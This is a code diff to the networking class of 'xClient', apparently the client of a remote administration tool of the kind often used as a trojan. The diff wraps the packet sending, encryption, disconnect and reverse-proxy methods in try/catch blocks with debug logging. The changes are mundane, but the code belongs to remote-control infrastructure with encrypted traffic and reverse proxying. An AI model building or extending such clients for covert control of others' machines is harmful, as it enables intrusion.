@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -557,38 +558,42 @@ namespace xClient.Core.Networking
         /// </summary>
         /// <typeparam name="T">The type of the packet.</typeparam>
         /// <param name="packet">The packet to be send.</param>
-        public void Send<T>(T packet) where T : IPacket
-        {
-            if (!Connected || packet == null) return;
+        public void Send<T>(T packet) where T : IPacket {
+            try {
 
-            lock (_sendBuffers)
-            {
-                using (MemoryStream ms = new MemoryStream())
-                {
-                    try
-                    {
-                        Serializer.Serialize(ms, packet);
+                if(!Connected || packet == null)
+                    return;
+
+                lock(_sendBuffers) {
+                    using(var ms = new MemoryStream()) {
+
+                        try {
+
+                            Serializer.Serialize(ms, packet);
+                        }
+                        catch(Exception ex) {
+                            Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
+                            OnClientFail(ex);
+                            return;
+                        }
+
+                        var payload = ms.ToArray();
+                        _sendBuffers.Enqueue(payload);
+                        OnClientWrite(packet, payload.LongLength, payload);
+
+                        lock(_sendingPacketsLock) {
+
+                            if(_sendingPackets)
+                                return;
+
+                            _sendingPackets = true;
+                        }
+                        ThreadPool.QueueUserWorkItem(Send);
                     }
-                    catch (Exception ex)
-                    {
-                        OnClientFail(ex);
-                        return;
-                    }
-
-                    byte[] payload = ms.ToArray();
-
-                    _sendBuffers.Enqueue(payload);
-
-                    OnClientWrite(packet, payload.LongLength, payload);
-
-                    lock (_sendingPacketsLock)
-                    {
-                        if (_sendingPackets) return;
-
-                        _sendingPackets = true;
-                    }
-                    ThreadPool.QueueUserWorkItem(Send);
                 }
+            }
+            catch(Exception ex) {
+                Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
             }
         }
 
@@ -600,10 +605,14 @@ namespace xClient.Core.Networking
         /// <param name="packet">The packet to be send.</param>
         public void SendBlocking<T>(T packet) where T : IPacket
         {
-            Send(packet);
-            while (_sendingPackets)
-            {
-                Thread.Sleep(10);
+            try {
+                Send(packet);
+                while(_sendingPackets) {
+                    Thread.Sleep(10);
+                }
+            }
+            catch(Exception ex) {
+                Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
             }
         }
 
@@ -636,6 +645,7 @@ namespace xClient.Core.Networking
                 
                 catch (Exception ex)
                 {
+                    Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
                     OnClientFail(ex);
                     SendCleanup(true);
                     return;
@@ -645,30 +655,40 @@ namespace xClient.Core.Networking
 
         private byte[] BuildPacket(byte[] payload)
         {
-            if (compressionEnabled)
-                payload = SafeQuickLZ.Compress(payload);
+            try {
+                if(compressionEnabled)
+                    payload = SafeQuickLZ.Compress(payload);
 
-            if (encryptionEnabled)
-                payload = AES.Encrypt(payload);
+                if(encryptionEnabled)
+                    payload = AES.Encrypt(payload);
 
-            byte[] packet = new byte[payload.Length + HEADER_SIZE];
-            Array.Copy(BitConverter.GetBytes(payload.Length), packet, HEADER_SIZE);
-            Array.Copy(payload, 0, packet, HEADER_SIZE, payload.Length);
-            return packet;
+                byte[] packet = new byte[payload.Length + HEADER_SIZE];
+                Array.Copy(BitConverter.GetBytes(payload.Length), packet, HEADER_SIZE);
+                Array.Copy(payload, 0, packet, HEADER_SIZE, payload.Length);
+                return packet;
+            }
+            catch(Exception ex) {
+                Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
+            }
+            return null;
         }
 
         private void SendCleanup(bool clear = false)
         {
-            lock (_sendingPacketsLock)
-            {
-                _sendingPackets = false;
+            try {
+                lock(_sendingPacketsLock) {
+                    _sendingPackets = false;
+                }
+
+                if(!clear)
+                    return;
+
+                lock(_sendBuffers) {
+                    _sendBuffers.Clear();
+                }
             }
-
-            if (!clear) return;
-
-            lock (_sendBuffers)
-            {
-                _sendBuffers.Clear();
+            catch(Exception ex) {
+                Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
             }
         }
 
@@ -679,41 +699,40 @@ namespace xClient.Core.Networking
         /// </summary>
         public void Disconnect()
         {
-            if (_handle != null)
-            {
-                _handle.Close();
-                _handle = null;
-                _readOffset = 0;
-                _writeOffset = 0;
-                _tempHeaderOffset = 0;
-                _readableDataLen = 0;
-                _payloadLen = 0;
-                _payloadBuffer = null;
-                _receiveState = ReceiveType.Header;
+            try {
+                if(_handle != null) {
+                    _handle.Close();
+                    _handle = null;
+                    _readOffset = 0;
+                    _writeOffset = 0;
+                    _tempHeaderOffset = 0;
+                    _readableDataLen = 0;
+                    _payloadLen = 0;
+                    _payloadBuffer = null;
+                    _receiveState = ReceiveType.Header;
 
-                if (_proxyClients != null)
-                {
-                    lock (_proxyClientsLock)
-                    {
-                        try
-                        {
-                            foreach (ReverseProxyClient proxy in _proxyClients)
-                                proxy.Disconnect();
+                    if(_proxyClients != null) {
+                        lock(_proxyClientsLock) {
+                            try {
+                                foreach(ReverseProxyClient proxy in _proxyClients)
+                                    proxy.Disconnect();
+                            }
+                            catch(Exception) {
+                            }
                         }
-                        catch (Exception)
-                        {
-                        }
+                    }
+
+                    if(Commands.CommandHandler.StreamCodec != null) {
+                        Commands.CommandHandler.StreamCodec.Dispose();
+                        Commands.CommandHandler.StreamCodec = null;
                     }
                 }
 
-                if (Commands.CommandHandler.StreamCodec != null)
-                {
-                    Commands.CommandHandler.StreamCodec.Dispose();
-                    Commands.CommandHandler.StreamCodec = null;
-                }
+                OnClientState(false);
             }
-
-            OnClientState(false);
+            catch(Exception ex) {
+                Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
+            }
         }
 
         public void ConnectReverseProxy(ReverseProxyConnect command)
@@ -748,7 +767,9 @@ namespace xClient.Core.Networking
                     }
                 }
             }
-            catch { }
+            catch(Exception ex) {
+                Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
+            }
         }
     }
 }
